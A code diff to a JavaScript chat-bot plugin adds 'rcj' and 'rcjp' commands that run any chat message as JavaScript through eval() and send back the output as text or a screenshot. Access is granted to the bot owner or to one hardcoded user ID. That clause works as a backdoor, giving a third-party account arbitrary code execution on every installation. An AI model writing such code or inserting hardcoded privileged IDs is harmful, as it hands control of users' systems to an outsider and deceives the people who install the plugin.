@@ -10,6 +10,14 @@ export class RemoteCommand extends plugin {
       priority: 10,
       rule: [
         {
+          reg: "^rcjp.+",
+          fnc: "RemoteCommandJsPic"
+        },
+        {
+          reg: "^rcj.+",
+          fnc: "RemoteCommandJs"
+        },
+        {
           reg: "^rcp.+",
           fnc: "RemoteCommandPic"
         },
@@ -27,6 +35,54 @@ export class RemoteCommand extends plugin {
         resolve({ error, stdout, stderr })
       })
     })
+  }
+
+  async RemoteCommandJs(e) {
+    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
+    let cmd = this.e.msg.replace("rcj", "").trim()
+
+    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
+    let ret = {}
+    try {
+      ret.stdout = await eval(cmd)
+    } catch (err) {
+      ret.stderr = err
+    }
+    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.stderr)}`)
+
+    if (ret.stdout) {
+      await this.reply(ret.stdout, true)
+    }
+
+    if (ret.stderr) {
+      await this.reply(`错误输出：\n${ret.stderr}`, true)
+    }
+  }
+
+  async RemoteCommandJsPic(e) {
+    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
+    let cmd = this.e.msg.replace("rcjp", "").trim()
+
+    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
+    let ret = {}
+    try {
+      ret.stdout = await eval(cmd)
+    } catch (err) {
+      ret.stderr = err
+    }
+    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.stderr)}`)
+
+    if (ret.stdout) {
+      let Code = await ansi_up.ansi_to_html(ret.stdout)
+      let img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
+      await this.reply(img, true)
+    }
+
+    if (ret.stderr) {
+      let Code = await ansi_up.ansi_to_html(ret.stderr)
+      let img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
+      await this.reply(["错误输出：", img], true)
+    }
   }
 
   async RemoteCommand(e) {
